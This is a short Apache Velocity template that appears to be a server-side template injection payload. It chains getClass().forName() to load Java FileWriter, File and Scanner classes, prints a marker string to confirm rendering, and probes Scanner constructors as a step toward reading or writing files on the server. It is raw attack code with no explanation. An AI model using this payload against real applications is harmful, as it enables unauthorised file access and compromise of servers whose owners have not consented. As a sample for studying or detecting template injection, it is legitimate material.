#set( $monkey = '888888888888888888888888=========99999999999999999999999' )
$monkey
#set ($e="exp")
#set ($a=$e.getClass().forName("java.io.FileWriter"))
$a
#set ($ab=$e.getClass().forName("java.io.File"))
$ab
#set($sc = $e.getClass().forName("java.util.Scanner"))
$sc
#set($str=$class.inspect("java.lang.String").type)
$str
#set($constructors = $sc.getDeclaredConstructors($e.getClass().forName("java.io.FileWriter")))
$constructors
#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.FileWriter"), $str) )
$constructor
$monkey
